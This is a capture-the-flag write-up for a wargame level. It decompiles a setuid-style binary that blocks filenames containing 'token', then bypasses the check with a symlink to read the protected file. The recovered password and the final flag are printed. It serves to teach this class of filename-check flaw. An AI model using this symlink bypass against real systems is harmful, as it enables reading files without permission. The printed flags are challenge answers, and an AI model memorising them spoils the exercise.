## Phase 1: Reconnaissance

We start by listing the files in the current directory

There are two files present:
- A binary named `level08`
- A text file named `token`

We can execute the binary, but we do **not** have read permissions on the `token` file

---

## Phase 2: Static Analysis

We extract the binary to our local machine and analyze it using **dogbolt.org** to obtain a readable C version

The simplified decompiled code looks like this:

```c
int main(int argc, const char **argv, const char **envp)
{
  int fd; 
  ssize_t file; 
  char buf[1024];
  unsigned int C; 


  if (argc == 1)
  {
    printf("%s [file to read]\n", *argv);
    exit(1);
  }

  if (strstr(argv[1], "token"))           // if filename contains `token`, exit
  {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
  }

  fd = open(argv[1], 0);                // open only for reading
  if (fd == -1)
    err(1, "Unable to open %s", argv[1]);

  file = read(fd, buf, 1024);           // read argv[1] and save 1024 bytes into buf 
  if (file == -1)
    err(1, "Unable to read fd %d", A);


  return write(1, buf, file);           // print buf
  write(1, "hello", 1024);
}
```

---

## Phase 3: Vulnerability

From the code we can see that:
- The program simply reads and prints the contents of the file given as `argv[1]`
- It blocks access only if the **filename contains the string `token`**

This means the protection relies entirely on the **file name**, not on the file itself

This looks like an attack vector for a "symlink attack"


---

## Phase 4: Exploitation (Symlink Attack)

For a symlink attack we need to make a symbolic link  
  - A symbolic link is just a shortcut to another file  
  - Executing or opening a symlink is exactly the same as opening the original file it points to

So we need to create a symbolic link that:
- Does **not** contain the word `token`
- Points to the real `token` file

```bash
ln -s /home/user/level08/token /tmp/flag_link
```

> It's important to understand that if the symlink contains a relative name like `token`, Linux will look for that file in the same folder where the symlink is
> 
> So if the symlink is in /tmp, Linux looks for /tmp/token (which is not there in this case)
> 
> That's why it's important to give them absolute paths  

We now run the binary using the symlink as argument:

```bash
./level08 /tmp/flag_link
```

Output:

```txt
quif5eloekouj29ke0vouxean
```

And we successfully printed the contents of the `token` file

After this, we do `su flag08` and use our `token` as password then run getflag
```console
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
